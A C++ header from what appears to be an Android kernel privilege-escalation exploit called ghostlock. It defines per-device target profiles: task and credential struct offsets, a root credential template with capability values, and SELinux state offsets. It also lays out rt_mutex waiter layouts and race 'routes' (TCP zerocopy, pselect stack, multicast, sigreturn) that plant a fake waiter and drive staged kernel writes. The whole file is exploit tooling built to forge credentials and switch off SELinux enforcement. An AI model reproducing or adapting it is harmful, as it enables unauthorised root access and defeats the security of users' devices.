#ifndef GHOSTLOCK_PROFILE_H
#define GHOSTLOCK_PROFILE_H

#include <cstddef>
#include <cstdint>

#include <array>
#include <cstring>
#include <optional>
#include <string_view>
#include <utility>

namespace ghostlock::profile {
    /* PROFILE-SUGGEST-01: only kernel geometry (kernel_major, symbol and struct
     * offsets, waiter layout, credential template) is truly required. Kotlin merges
     * the shipped execution defaults and user overrides before the profile reaches
     * native; see docs/kernel_profiles/defaults*.md. */
    struct execution_settings {
        uint32_t recommended_main_cpu, recommended_consumer_cpu;
        uint32_t heap_prepare_max_attempts, heap_prepare_timeout_ms;
        uint32_t heap_kernelsnitch_timeout_ms;
        uint32_t race_route_wait_ms, race_route_done_timeout_ms;
        uint32_t race_setup_settle_us;
        uint32_t race_state_poll_interval_us;
        uint32_t w1_attempts, w1_settle_us, w1_scratch_repair_attempts;
        uint32_t w2_attempts, w2_settle_us;
        uint32_t w3_chain_rounds, w3_attempts, w3_settle_us;
        uint32_t tcp_attempts, tcp_arm_sequence;
        uint32_t tcp_post_receive_hold_iterations;
        uint32_t select_enter_delay_us, select_timeout_us;
        uint32_t select_consumer_max_calls, select_consumer_burst_calls;
        uint32_t handoff_pre_dispatch_settle_ms, handoff_module_poll_attempts;
        uint32_t handoff_module_poll_interval_ms, handoff_enforce_poll_attempts;
        uint32_t handoff_enforce_poll_interval_ms;
    };


    /* Explicit route selection written by the profile ("route": "<name>").
     * Geometry inference below exists only for profiles predating the field. */
    enum class RouteKind : uint8_t {
        Auto = 0,
        TcpZerocopy = 1,
        SelectStack = 2,
        MulticastWaiter = 3,
        /* A stamp delivered by rt_sigreturn's fpsimd copy instead of the pselect
         * fd_set buffer; the only route that reaches the pre-5.10.136 waiter
         * depth. See the fork's docs/analysis/sigreturn-stamp-route-plan.md. */
        Sigreturn = 4,
    };

    /* Wire values for the v2 binary transport and the v1 JSON converter. */
    inline constexpr uint8_t kRouteAuto = std::to_underlying(RouteKind::Auto);
    inline constexpr uint8_t kRouteTcpZerocopy =
            std::to_underlying(RouteKind::TcpZerocopy);
    inline constexpr uint8_t kRouteSelectStack =
            std::to_underlying(RouteKind::SelectStack);
    inline constexpr uint8_t kRouteMulticastWaiter =
            std::to_underlying(RouteKind::MulticastWaiter);
    inline constexpr uint8_t kRouteSigreturn =
            std::to_underlying(RouteKind::Sigreturn);

    /* Single native route catalog: token <-> wire value. Adding a route means
     * one entry here plus its RoutePolicy / procedure. */
    struct RouteCatalogEntry {
        std::string_view token;
        uint8_t wire;
    };

    inline constexpr RouteCatalogEntry kRouteCatalog[] = {
        {"tcp_zerocopy", kRouteTcpZerocopy},
        {"select_stack", kRouteSelectStack},
        {"multicast_waiter", kRouteMulticastWaiter},
        {"sigreturn", kRouteSigreturn},
    };

    [[nodiscard]] inline uint8_t route_kind_from_string(std::string_view name) {
        for (const RouteCatalogEntry &entry : kRouteCatalog) {
            if (name == entry.token) return entry.wire;
        }
        return kRouteAuto;
    }

    /* Wire v2 model objects, one per transport section. Signedness/width mirror
     * Kotlin (uint8_t->UByte, uint32_t->UInt, uint64_t->ULong, int32_t->Int).
     * Fields with a runtime fallback are std::optional: absence means "not
     * provided", distinct from a provided 0 (kernel_phys_load = 0 is
     * meaningful). The wire carries presence by key occurrence. */
    struct ProfileMeta {
        uint8_t kernel_major = 0;
        uint8_t recommend_shizuku = 0;
        uint8_t fallback_route = 0;
        uint8_t safe_mode = 0;
    };

    struct TaskStructOffsets {
        uint32_t prio = 0, normal_prio = 0, sched_task_group = 0;
        uint32_t pi_lock = 0, pi_waiters = 0, pi_top_task = 0, pi_blocked_on = 0;
        uint32_t pid = 0, tgid = 0, atomic_flags = 0;
        uint32_t real_cred = 0, cred = 0, comm = 0, tasks = 0, seccomp = 0;
    };

    struct CredTemplate {
        uint32_t copy_size = 0, usage_offset = 0, usage_value = 0;
        /* Stage-3 BTF facts; absent = the compiled/release fallback. */
        std::optional<uint8_t> usage_size;
        std::optional<uint32_t> uid_offset;
        std::optional<uint32_t> security_offset;
        uint32_t caps_offset = 0, caps_count = 0;
        uint64_t caps_value = 0;
        uint32_t ref_count = 0;
        uint32_t ref0_offset = 0, ref1_offset = 0, ref2_offset = 0, ref3_offset = 0;
        uint64_t ref0_image = 0, ref1_image = 0, ref2_image = 0, ref3_image = 0;
    };

    struct KernelOffsets {
        uint64_t init_task = 0, init_cred = 0, empty_zero_page = 0;
        uint64_t root_task_group = 0, selinux_enforcing = 0;
        uint64_t selinux_blob_sizes = 0, security_hook_heads = 0;
        uint64_t slide_nfulnl_logger = 0, slide_loggers_0_1 = 0, slide_boot_id = 0;
    };

    struct KernelMisc {
        std::optional<uint64_t> kernel_phys_load;
        /* DRAM base (linear-map PHYS_OFFSET) used for image->direct-map
         * translation. Absence falls back to the compiled P0_PHYS_OFFSET, so
         * devices whose DRAM base differs from the built-in default can
         * override it without a rebuild. */
        std::optional<uint64_t> kernel_phys_offset;
        std::optional<uint8_t> compact_waiter;
        std::optional<uint32_t> kernelsnitch_collisions;
        /* The mm_struct SLUB object stride, written only from a measurement
         * (the generation picker or the root slabinfo read). Absence means
         * the compiled default and the stride-agnostic scan. */
        std::optional<uint32_t> mm_struct_sz;
        /* `sizeof(struct rt_mutex)` from BTF; the anchor's slot spacing must
         * not be smaller. Absent = the route's compiled minimum. */
        std::optional<uint32_t> rt_mutex_size;
    };

    /* Per-image `struct rt_mutex_waiter` shape. The field offsets are emitted
     * for validation/future families; the behaviour gates are `compact` (the
     * 5.15/6.1 word shape vs the 6.6/6.12 rb_node shape) and `wake_state`
     * (whether the prio word is packed). Absent = the release fallback. */
    struct WaiterLayoutOffsets {
        std::optional<uint8_t> compact;
        std::optional<uint32_t> pi_tree;
        std::optional<uint32_t> task;
        std::optional<uint32_t> lock;
        std::optional<uint32_t> wake_state;
    };

    struct RouteGeometry {
        std::optional<int32_t> pselect_waiter_shift;
        std::optional<int32_t> mcast_waiter_off;
        std::optional<uint32_t> mcast_buffer_size;
        std::optional<uint32_t> mcast_task_offset;
        std::optional<uint32_t> mcast_lock_offset;
        /* Image-relative offset of a zero, writable, reference-free region used
         * as the walk's fake rt_mutex instead of the reclaimed page. Absent =>
         * the reclaimed page is used, i.e. the previous behaviour.
         * See docs/analysis/payload-page-option2-plan.md. */
        std::optional<uint64_t> select_lock_anchor_image;
        /* Length of the verified-safe part of that region, and the distance
         * between slots within it. Both are properties of one kernel build (a
         * symbol layout and `sizeof(struct rt_mutex)`), so both belong in the
         * profile rather than in the route's source. Absent => this build's
         * 0x1000 and 0x20. See the geometry check in select_stack_route.cpp. */
        std::optional<uint64_t> select_lock_anchor_bytes;
        std::optional<uint64_t> select_lock_anchor_stride;
        /* Compat (AArch32) select carrier: the select route runs in a 32-bit
         * helper because these kernels' strip is below the 64-bit pselect
         * buffer. `waiter_home` is the measured strip home below the compat
         * entry sp (0x1b0 futex_time32 / 0x1c0 futex_time64) and
         * `select_dst_depth` the measured compat _newselect buffer depth
         * (0x1e0). Absent `compat_carrier` (or 0) keeps the 64-bit route.
         * See docs/analysis/compat-select-carrier-plan.md. */
        std::optional<uint8_t> select_compat_carrier;
        std::optional<uint32_t> select_waiter_home;
        std::optional<uint32_t> select_select_dst_depth;
        /* Sigreturn route: where waiter byte 0 sits inside the 0x200-byte fpsimd
         * copy window `rt_sigreturn`'s restore performs. The value is per build
         * and per restore helper -- the SVE path copies at sp+0x10, the plain
         * path at sp+0x00 -- and is derived mechanically:
         *   waiter_off = chain_sum - dst_offset - waiter_depth
         * (5.10.81: 0x150 / 0x140; 5.10.236: 0x100 / 0xf0). Absent => this
         * profile's build has no measured geometry, and the route refuses at
         * prepare() rather than stamping at an unverified depth. */
        std::optional<uint64_t> sig_waiter_off_sve;
        std::optional<uint64_t> sig_waiter_off_plain;
    };

    /* Native transport representation of one Kotlin-resolved profile. */
    /* `selinux_state`'s field offsets (page-free Stage 1). `offset.
     * selinux_enforcing` is the image offset of the struct itself; these are
     * the fields inside it that W1's value lands on. Absent => the
     * release-derived layout (enforcing 0; initialized 2 below 6.6, 1 from
     * 6.6 -- checkreqprot sat between them until it was removed at 6.6). */
    struct SelinuxFieldOffsets {
        std::optional<uint32_t> enforcing;
        std::optional<uint32_t> initialized;
    };

    /* W1's value source when the write does not use the reclaimed page: the
     * image offset of a zeroed region whose direct-map alias (+0x100) becomes
     * the value stored over selinux_state. Absent => the page path. */
    struct W1ScratchSpec {
        std::optional<uint64_t> image;
    };

    struct kernel_offsets {
        const char *uname_r;
        uint8_t route;
        ProfileMeta meta;
        TaskStructOffsets task;
        CredTemplate credential;
        WaiterLayoutOffsets waiter;
        KernelOffsets offsets;
        KernelMisc misc;
        SelinuxFieldOffsets selinux;
        W1ScratchSpec w1_scratch;
        RouteGeometry geometry;
        struct execution_settings execution;

        /* Typed view of the wire route field so callers need no cast. */
        [[nodiscard]] RouteKind route_kind() const noexcept {
            return static_cast<RouteKind>(route);
        }
    };

    struct MulticastWaiterLayout {
        std::optional<int32_t> waiter_offset;
        std::optional<uint32_t> buffer_size, task_offset, lock_offset;
        /* The same anchor keys the other routes carry. The lock word is
         * route-independent, and a document never merges another route's
         * section, so this route's own section has to be able to state it.
         * Absent => the reclaimed payload page is used, i.e. the previous
         * behaviour. */
        std::optional<uint64_t> lock_anchor_image;
        std::optional<uint64_t> lock_anchor_bytes;
        std::optional<uint64_t> lock_anchor_stride;
    };

    struct SelectStackLayout {
        std::optional<int32_t> waiter_shift;
        std::optional<uint8_t> compact_waiter;
        /* When present, the waiter's `lock` word carries this anchor (image
         * offset) instead of fake_lock, so the walk's tree lives in a region we
         * know is zero and nobody writes. */
        std::optional<uint64_t> lock_anchor_image;
        std::optional<uint64_t> lock_anchor_bytes;
        std::optional<uint64_t> lock_anchor_stride;
        /* Compat carrier (AArch32 helper). `waiter_home`/`select_dst_depth`
         * are the measured geometry; the bitmap packer refuses any pair it
         * cannot cover (in particular 5.10.236's 0x200/0x210 strips). */
        std::optional<uint8_t> compat_carrier;
        std::optional<uint32_t> waiter_home;
        std::optional<uint32_t> select_dst_depth;
    };

    struct TcpZerocopyLayout {
        std::optional<uint8_t> compact_waiter;
    };

    /* The sigreturn route's geometry: the two copy-window offsets, plus the same
     * anchor keys the select route uses (the lock word is route-independent --
     * both routes point the fake waiter's `lock` at the same zeroed .bss slot
     * grid). */
    struct SigreturnLayout {
        std::optional<uint64_t> waiter_off_sve;
        std::optional<uint64_t> waiter_off_plain;
        std::optional<uint64_t> lock_anchor_image;
        std::optional<uint64_t> lock_anchor_bytes;
        std::optional<uint64_t> lock_anchor_stride;
    };


    /* Immutable runtime snapshot copied from the transport representation.
     * The C++ value owns uname_r and rebinds the transport pointer after every
     * copy/move. The C layout remains available as a compatibility façade. */
    class TargetProfile final {
    public:
        TargetProfile() noexcept = default;

        explicit TargetProfile(const struct kernel_offsets &transport) noexcept
            : values_(transport), loaded_(true) {
            copy_release(transport.uname_r);
        }

        TargetProfile(const TargetProfile &other) noexcept
            : values_(other.values_), release_(other.release_),
              loaded_(other.loaded_) {
            rebind_release();
        }

        TargetProfile &operator=(const TargetProfile &other) noexcept {
            if (this != &other) {
                values_ = other.values_;
                release_ = other.release_;
                loaded_ = other.loaded_;
                rebind_release();
            }
            return *this;
        }

        /* `major.minor` of the release string, 0/0 when it does not parse. */
        void release_version(unsigned &major, unsigned &minor) const noexcept {
            major = 0;
            minor = 0;
            const char *p = release();
            while (*p >= '0' && *p <= '9') {
                major = major * 10U + static_cast<unsigned>(*p - '0');
                p++;
            }
            if (major != 0 && *p == '.') {
                p++;
                while (*p >= '0' && *p <= '9') {
                    minor = minor * 10U + static_cast<unsigned>(*p - '0');
                    p++;
                }
            }
        }

        /* Delegates to the copy constructor on purpose: rebinds the release buffer
       * and keeps the moved-from profile valid for the process-wide accessor. */
        TargetProfile(TargetProfile &&other) noexcept
            : TargetProfile(other) { // NOLINT(performance-move-constructor-init)
        }

        TargetProfile &operator=(TargetProfile &&other) noexcept {
            return *this = other;
        }

        [[nodiscard]] const struct kernel_offsets *values() const noexcept {
            return loaded_ ? &values_ : nullptr;
        }

        [[nodiscard]] bool loaded() const noexcept { return loaded_; }

        [[nodiscard]] RouteKind route() const noexcept {
            return loaded_ ? static_cast<RouteKind>(values_.route) : RouteKind::Auto;
        }

        [[nodiscard]] RouteKind fallback_route() const noexcept {
            return loaded_ ? static_cast<RouteKind>(values_.meta.fallback_route) : RouteKind::Auto;
        }

        [[nodiscard]] bool supports(RouteKind kind) const noexcept {
            return route() == kind;
        }

        [[nodiscard]] const char *release() const noexcept {
            return loaded_ && values_.uname_r ? values_.uname_r : "";
        }

        /* Which `struct rt_mutex_waiter` priority layout the device has.
         *
         * compact_waiter is a document-global boolean that covers three families,
         * but the word at waiter+0x40 is only `int prio` on 5.10: 5.15 added
         * `unsigned int wake_state` there and moved prio to +0x44. kernel_major
         * cannot discriminate them (both are major 5), so the minor comes from the
         * release string -- the resolved profile always carries the device's own
         * uname (ProfileMerger stamps it). A release that does not parse falls back
         * to the major alone, which is certain for 6.x and leaves a 5.x template on
         * the 5.10 shape (templates are not runnable profiles).
         *
         * See docs/analysis/waiter-layout-family-gating-plan.md. */
        [[nodiscard]] bool compact_waiter_has_wake_state() const noexcept {
            if (!loaded_) return false;
            /* A per-image waiter layout is authoritative when present: the
             * compact shape with a wake_state field is 5.15/6.1, the
             * non-compact shape is 6.6/6.12. The release predicate below
             * remains for profiles that predate the key. */
            if (values_.waiter.compact.has_value()) {
                return *values_.waiter.compact != 0 &&
                       values_.waiter.wake_state.has_value();
            }
            unsigned major = 0;
            unsigned minor = 0;
            const char *p = release();
            while (*p >= '0' && *p <= '9') {
                major = major * 10U + static_cast<unsigned>(*p - '0');
                p++;
            }
            if (major != 0 && *p == '.') {
                p++;
                while (*p >= '0' && *p <= '9') {
                    minor = minor * 10U + static_cast<unsigned>(*p - '0');
                    p++;
                }
            }
            if (major == 0) return values_.meta.kernel_major >= 6;
            return major > 5U || (major == 5U && minor >= 15U);
        }

        [[nodiscard]] const struct execution_settings *execution() const noexcept {
            return loaded_ ? &values_.execution : nullptr;
        }

        /* Typed execution-config getters. Every execution field is an unsigned
         * 32-bit value both in `execution_settings` and on the wire (the legacy
         * JSON parser also rejects negatives), so each getter returns uint32_t
         * and no static_cast is required at the call site. */
#define GHOSTLOCK_EXEC_U32(name) \
        [[nodiscard]] uint32_t name() const noexcept { return values_.execution.name; }
        GHOSTLOCK_EXEC_U32(recommended_main_cpu)
        GHOSTLOCK_EXEC_U32(recommended_consumer_cpu)
        GHOSTLOCK_EXEC_U32(heap_prepare_max_attempts)
        GHOSTLOCK_EXEC_U32(heap_prepare_timeout_ms)
        GHOSTLOCK_EXEC_U32(heap_kernelsnitch_timeout_ms)
        GHOSTLOCK_EXEC_U32(race_route_wait_ms)
        [[nodiscard]] uint32_t race_route_done_timeout_ms() const noexcept {
            constexpr uint32_t kDefaultRouteDoneTimeoutMs = 300000;
            return or_default(values_.execution.race_route_done_timeout_ms,
                              kDefaultRouteDoneTimeoutMs);
        }
        GHOSTLOCK_EXEC_U32(race_setup_settle_us)
        GHOSTLOCK_EXEC_U32(race_state_poll_interval_us)
        GHOSTLOCK_EXEC_U32(w1_attempts)
        GHOSTLOCK_EXEC_U32(w1_settle_us)
        GHOSTLOCK_EXEC_U32(w1_scratch_repair_attempts)
        GHOSTLOCK_EXEC_U32(w2_attempts)
        GHOSTLOCK_EXEC_U32(w2_settle_us)
        GHOSTLOCK_EXEC_U32(w3_chain_rounds)
        GHOSTLOCK_EXEC_U32(w3_attempts)
        GHOSTLOCK_EXEC_U32(w3_settle_us)
        GHOSTLOCK_EXEC_U32(tcp_attempts)
        GHOSTLOCK_EXEC_U32(tcp_arm_sequence)
        GHOSTLOCK_EXEC_U32(tcp_post_receive_hold_iterations)
        GHOSTLOCK_EXEC_U32(select_enter_delay_us)
        GHOSTLOCK_EXEC_U32(select_timeout_us)
        GHOSTLOCK_EXEC_U32(select_consumer_max_calls)
        GHOSTLOCK_EXEC_U32(select_consumer_burst_calls)
        GHOSTLOCK_EXEC_U32(handoff_pre_dispatch_settle_ms)
        GHOSTLOCK_EXEC_U32(handoff_module_poll_attempts)
        GHOSTLOCK_EXEC_U32(handoff_module_poll_interval_ms)
        GHOSTLOCK_EXEC_U32(handoff_enforce_poll_attempts)
        GHOSTLOCK_EXEC_U32(handoff_enforce_poll_interval_ms)
#undef GHOSTLOCK_EXEC_U32

        [[nodiscard]] bool has_compact_waiter() const noexcept {
            if (!loaded_) return false;
            if (values_.waiter.compact.has_value()) {
                return *values_.waiter.compact != 0;
            }
            return values_.misc.compact_waiter.value_or(0) != 0;
        }

        [[nodiscard]] std::optional<uint8_t> cred_usage_size() const noexcept {
            return loaded_ ? values_.credential.usage_size : std::nullopt;
        }

        [[nodiscard]] std::optional<uint32_t> cred_uid_offset() const noexcept {
            return loaded_ ? values_.credential.uid_offset : std::nullopt;
        }

        [[nodiscard]] std::optional<uint32_t> cred_security_offset() const noexcept {
            return loaded_ ? values_.credential.security_offset : std::nullopt;
        }

        [[nodiscard]] std::optional<uint32_t> rt_mutex_size() const noexcept {
            return loaded_ ? values_.misc.rt_mutex_size : std::nullopt;
        }

        [[nodiscard]] const WaiterLayoutOffsets &waiter_layout() const noexcept {
            return values_.waiter;
        }

        [[nodiscard]] bool safe_mode() const noexcept {
            return loaded_ && values_.meta.safe_mode;
        }

        [[nodiscard]] uint8_t kernel_major() const noexcept {
            return loaded_ ? values_.meta.kernel_major : 0;
        }

        /* Page-free Stage 1: the image offset of W1's scratch region, absent
         * when the profile keeps the reclaimed-page value. */
        [[nodiscard]] std::optional<uint64_t> w1_scratch_image() const noexcept {
            return loaded_ ? values_.w1_scratch.image : std::nullopt;
        }

        /* The byte of the W1 value that lands on `selinux_state.initialized`.
         * A profile fact when the `selinux` block states it; otherwise
         * release-derived, which is what every pre-stage-1 profile resolves
         * to. */
        [[nodiscard]] uint32_t selinux_initialized_offset() const noexcept {
            if (!loaded_) return 2;
            if (values_.selinux.initialized.has_value()) {
                return *values_.selinux.initialized;
            }
            unsigned major = 0;
            unsigned minor = 0;
            release_version(major, minor);
            if (major == 0) return 2;
            return (major > 6U || (major == 6U && minor >= 6U)) ? 1U : 2U;
        }

        /* `selinux_state.enforcing`'s byte inside the struct (0 on every
         * sampled image; stated by the profile so a future layout cannot
         * silently keep the old constant). */
        [[nodiscard]] uint32_t selinux_enforcing_offset() const noexcept {
            return loaded_ && values_.selinux.enforcing.has_value()
                       ? *values_.selinux.enforcing
                       : 0;
        }

        [[nodiscard]] MulticastWaiterLayout multicast_layout() const noexcept {
            return loaded_
                       ? (MulticastWaiterLayout){
                           .waiter_offset = values_.geometry.mcast_waiter_off,
                           .buffer_size = values_.geometry.mcast_buffer_size,
                           .task_offset = values_.geometry.mcast_task_offset,
                           .lock_offset = values_.geometry.mcast_lock_offset,
                           /* One shared anchor storage for every route (the
                            * sigreturn route already reuses these fields);
                            * only the transport section differs. */
                           .lock_anchor_image = values_.geometry.select_lock_anchor_image,
                           .lock_anchor_bytes = values_.geometry.select_lock_anchor_bytes,
                           .lock_anchor_stride = values_.geometry.select_lock_anchor_stride,
                       }
                       : MulticastWaiterLayout{};
        }

        [[nodiscard]] SelectStackLayout select_stack_layout() const noexcept {
            return loaded_
                       ? (SelectStackLayout){
                           .waiter_shift = values_.geometry.pselect_waiter_shift,
                           .compact_waiter = values_.misc.compact_waiter,
                           .lock_anchor_image = values_.geometry.select_lock_anchor_image,
                           .lock_anchor_bytes = values_.geometry.select_lock_anchor_bytes,
                           .lock_anchor_stride = values_.geometry.select_lock_anchor_stride,
                           .compat_carrier = values_.geometry.select_compat_carrier,
                           .waiter_home = values_.geometry.select_waiter_home,
                           .select_dst_depth = values_.geometry.select_select_dst_depth,
                       }
                       : SelectStackLayout{};
        }

        [[nodiscard]] TcpZerocopyLayout tcp_zerocopy_layout() const noexcept {
            return (TcpZerocopyLayout){.compact_waiter = values_.misc.compact_waiter};
        }

        [[nodiscard]] SigreturnLayout sigreturn_layout() const noexcept {
            return loaded_
                       ? (SigreturnLayout){
                           .waiter_off_sve = values_.geometry.sig_waiter_off_sve,
                           .waiter_off_plain = values_.geometry.sig_waiter_off_plain,
                           .lock_anchor_image = values_.geometry.select_lock_anchor_image,
                           .lock_anchor_bytes = values_.geometry.select_lock_anchor_bytes,
                           .lock_anchor_stride = values_.geometry.select_lock_anchor_stride,
                       }
                       : SigreturnLayout{};
        }

        [[nodiscard]] uint32_t or_default(uint32_t value, uint32_t fallback)
        const noexcept {
            return (loaded_ && value) ? value : fallback;
        }

        [[nodiscard]] uint32_t mm_struct_stride(uint32_t fallback) const noexcept {
            return or_default(loaded_ ? values_.misc.mm_struct_sz.value_or(0) : 0, fallback);
        }

        [[nodiscard]] uint64_t image(uint64_t offset, uint64_t image_base,
                                     uint64_t fallback_offset) const noexcept {
            return image_base + ((loaded_ && offset) ? offset : fallback_offset);
        }

        static TargetProfile from(const struct kernel_offsets *values) {
            return values ? TargetProfile(*values) : TargetProfile();
        }

    private:
        void copy_release(const char *release) noexcept {
            release_.fill('\0');
            if (release) {
                const size_t length = std::strlen(release);
                const size_t copied =
                        length < release_.size() ? length : release_.size() - 1;
                std::memcpy(release_.data(), release, copied);
            }
            rebind_release();
        }

        void rebind_release() noexcept {
            values_.uname_r = loaded_ ? release_.data() : nullptr;
        }

        struct kernel_offsets values_{};
        std::array<char, 256> release_{};
        bool loaded_ = false;
    };
} // namespace ghostlock::profile

#endif
